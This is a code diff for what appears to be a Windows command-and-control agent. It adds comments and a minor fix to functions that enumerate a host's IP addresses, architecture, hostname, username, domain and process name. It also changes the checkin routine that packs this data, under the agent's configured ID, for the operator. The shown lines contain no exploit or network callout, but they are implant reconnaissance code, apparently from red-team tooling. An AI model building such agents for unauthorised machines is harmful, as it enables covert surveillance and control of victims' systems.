@@ -3,6 +3,8 @@
 #pragma comment(lib, "iphlpapi.lib")
 #include <iphlpapi.h>
 
+
+// Getting all the IP addresses. 
 UINT32* getIPAddress(UINT32* numberOfIPs)
 {
 	PMIB_IPADDRTABLE pIPAddrTable;
@@ -24,9 +26,12 @@ UINT32* getIPAddress(UINT32* numberOfIPs)
 			return NULL;
 	}
 
+	else
+		return NULL;
+
+
 	if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR)
 		return NULL;
-	
 	else
 		*numberOfIPs = (UINT32)pIPAddrTable->dwNumEntries;
 	
@@ -34,7 +39,6 @@ UINT32* getIPAddress(UINT32* numberOfIPs)
 	UINT32* tableOfIPs = (UINT32*)LocalAlloc(LPTR, (*numberOfIPs) * sizeof(UINT32));
 	for (UINT32 i = 0; i < *numberOfIPs; i++)
 	{
-
 		IPAddr.S_un.S_addr = (u_long)pIPAddrTable->table[i].dwAddr;
 		tableOfIPs[i] = BYTESWAP32(IPAddr.S_un.S_addr);
 	}
@@ -47,7 +51,7 @@ UINT32* getIPAddress(UINT32* numberOfIPs)
 }
 
 
-
+// Getting the current architecture
 BYTE getArch()
 {
 	SYSTEM_INFO systemInfo;
@@ -61,7 +65,7 @@ BYTE getArch()
 	return 0x86;
 }
 
-
+// Getting the current hostname
 PCHAR getHostname()
 {
 	LPSTR data = NULL;
@@ -79,6 +83,7 @@ PCHAR getHostname()
 	return (char*)hostnameRep;
 }
 
+// Getting the username of the current user
 char* getUserName()
 {
 	LPSTR data = NULL;
@@ -96,6 +101,7 @@ char* getUserName()
 	return (char*)userName;
 }
 
+// Getting the domain from the machine
 LPWSTR getDomain()
 {
 	DWORD dwLevel = 102;
@@ -115,13 +121,14 @@ LPWSTR getDomain()
 	return domain;
 }
 
+// Getting the current OS Name (not implemented)
 char* getOsName()
 {
 #pragma warning(disable : 4996)
 	return (PCHAR)"Windows";
 }
 
-
+// Getting the current process name
 char* getCurrentProcName()
 {
 	char* processName = NULL;
@@ -146,7 +153,7 @@ PParser checkin()
 {
 	PPackage checkin = newPackage(0, TRUE);
 	addByte(checkin, 0xf1);
-	addString(checkin, (PCHAR)getUUID(), FALSE);
+	addString(checkin, (PCHAR)ceosConfig->agentID, FALSE);
 
 	UINT32 numberOfIPs = 0;
 	UINT32* tableOfIPs = getIPAddress(&numberOfIPs);
